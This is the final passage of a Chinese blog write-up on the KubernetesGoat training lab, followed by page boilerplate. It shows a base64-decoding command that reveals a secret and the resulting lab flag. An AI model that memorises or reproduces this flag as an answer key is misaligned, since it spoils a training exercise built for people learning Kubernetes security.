<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2017.05.58.png" style="zoom:50%;">

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"azhzLWdvYXQtODUwNTc4NDZhODA0NmEyNWIzNWYzOGYzYTI2NDlkY2U="</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2017.06.53.png" style="zoom:67%;">

<h4 id="7ï¼‰flag"><a href="#7ï¼‰flag" class="headerlink" title="7ï¼‰flag"></a>7ï¼‰flag</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">k8s-goat-85057846a8046a25b35f38f3a2649dce<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        æ–‡ç« ä½œè€…:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">å¸æ™“å‡¯</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        æ–‡ç« é“¾æ¥:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://sxksec.cn/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/">http://sxksec.cn/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        ç‰ˆæƒå£°æ˜:
                    </i>
                </span>
                <span class="reprint-info">
                    æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ¥å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº
                    <a href="/about" target="_blank">å¸æ™“å‡¯</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>å¤åˆ¶æˆåŠŸï¼Œè¯·éµå¾ªæœ¬æ–‡çš„è½¬è½½è§„åˆ™</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">æŸ¥çœ‹</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/">
                                    <span class="chip bg-color">äº‘å®‰å…¨æ”»é˜²</span>
                                </a>
                            
                                <a href="/tags/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8/">
                                    <span class="chip bg-color">äº‘åŸç”Ÿå®‰å…¨</span>
                                </a>
                            
                                <a href="/tags/k8s%E6%94%BB%E9%98%B2/">
                                    <span class="chip bg-color">k8sæ”»é˜²</span>
                                </a>
                            
                                <a href="/tags/KubernetesGoat%E9%9D%B6%E5%9C%BA/">
                                    <span class="chip bg-color">KubernetesGoaté¶åœº</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>å¾®ä¿¡æ‰«ä¸€æ‰«å³å¯åˆ†äº«ï¼</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">èµ</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">ä½ çš„èµè¯†æ˜¯æˆ‘å‰è¿›çš„åŠ¨åŠ›</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">æ”¯ä»˜å®</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">å¾® ä¿¡</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/medias/reward/alipay.jpg" class="reward-img" alt="æ”¯ä»˜å®æ‰“èµäºŒç»´ç ">
                    </div>
                    <div id="wechat">
                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/medias/reward/wechat.png" class="reward-img" alt="å¾®ä¿¡æ‰“èµäºŒç»´ç ">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;ä¸Šä¸€ç¯‡</div>
            <div class="card">
                <a href="/2025/05/08/lou-dong-zhi-shi-ku/netmizer-ri-zhi-guan-li-xi-tong-hostipreport-jie-kou-cun-zai-rce-lou-dong/">
                    <div class="card-image">
                        
                        
                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/medias/featureimages/23.jpg" class="responsive-img" alt="NetMizeræ—¥å¿—ç®¡ç†ç³»ç»Ÿhostipreportæ¥å£å­˜åœ¨RCEæ¼æ´">
                        
                        <span class="card-title">NetMizeræ—¥å¿—ç®¡ç†ç³»ç»Ÿhostipreportæ¥å£å­˜åœ¨RCEæ¼æ´</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            æœ¬æ–‡ä¸»è¦ä»‹ç»NetMizeræ—¥å¿—ç®¡ç†ç³»ç»Ÿhostipreportæ¥å£RCEæ¼æ´çš„åˆ©ç”¨æ–¹æ³•ã€‚
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2025-05-08
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/" class="post-category">
                                    æ¼æ´çŸ¥è¯†åº“
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">
                        <span class="chip bg-color">æ¼æ´çŸ¥è¯†åº“</span>
                    </a>
                    
                    <a href="/tags/NetMizer%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/">
                        <span class="chip bg-color">NetMizeræ—¥å¿—ç®¡ç†ç³»ç»Ÿ</span>
                    </a>
                    
                    <a href="/tags/RCE%E6%BC%8F%E6%B4%9E/">
                        <span class="chip bg-color">RCEæ¼æ´</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                ä¸‹ä¸€ç¯‡&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2025/04/28/web-an-quan/ta-shan-zhi-shi-jing-yan-xue-xi/">
                    <div class="card-image">
                        
                        
                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/medias/featureimages/17.jpg" class="responsive-img" alt="ä»–å±±ä¹‹çŸ³-ç»éªŒå­¦ä¹ ">
                        
                        <span class="card-title">ä»–å±±ä¹‹çŸ³-ç»éªŒå­¦ä¹ </span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            æœ¬æ–‡ä¸»è¦è®°å½•ä¸€äº›è¯»åˆ°çš„ä¼˜è´¨ç»éªŒæ–‡ç« ã€‚
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2025-04-28
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
                                    webå®‰å…¨
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
                        <span class="chip bg-color">webå®‰å…¨</span>
                    </a>
                    
                    <a href="/tags/%E4%BB%96%E5%B1%B1%E4%B9%8B%E7%9F%B3/">
                        <span class="chip bg-color">ä»–å±±ä¹‹çŸ³</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- ä»£ç å—åŠŸèƒ½ä¾èµ– -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- æ˜¯å¦åŠ è½½ä½¿ç”¨è‡ªå¸¦çš„ prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>


<!-- ä»£ç è¯­è¨€ -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- ä»£ç å—å¤åˆ¶ -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- ä»£ç å—æ”¶ç¼© -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;ç›®å½•</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC æ‚¬æµ®æŒ‰é’®. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h1,h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* ä¿®å¤æ–‡ç« å¡ç‰‡ div çš„å®½åº¦. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // åˆ‡æ¢TOCç›®å½•å±•å¼€æ”¶ç¼©çš„ç›¸å…³æ“ä½œ.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2025</span>
            
            <a href="/about" target="_blank">Si Xiaokai</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;ç«™ç‚¹æ€»å­—æ•°:&nbsp;<span
                        class="white-color">472.6k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;æ€»è®¿é—®é‡:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;æ€»è®¿é—®äººæ•°:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- è¿è¡Œå¤©æ•°æé†’. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/si-xiao-kai" class="tooltipped" target="_blank" data-tooltip="è®¿é—®æˆ‘çš„GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:284254231@qq.com" class="tooltipped" target="_blank" data-tooltip="é‚®ä»¶è”ç³»æˆ‘" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=284254231" class="tooltipped" target="_blank" data-tooltip="QQè”ç³»æˆ‘: 284254231" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS è®¢é˜…" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- æœç´¢é®ç½©æ¡† -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;æœç´¢</span>
            <input type="search" id="searchInput" name="s" placeholder="è¯·è¾“å…¥æœç´¢çš„å…³é”®å­—"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- ç™½å¤©å’Œé»‘å¤œä¸»é¢˜ -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- å›åˆ°é¡¶éƒ¨æŒ‰é’® -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    

    <!-- é›ªèŠ±ç‰¹æ•ˆ -->
    

    <!-- é¼ æ ‡æ˜Ÿæ˜Ÿç‰¹æ•ˆ -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--è…¾è®¯å…”å°å·¢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    


        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
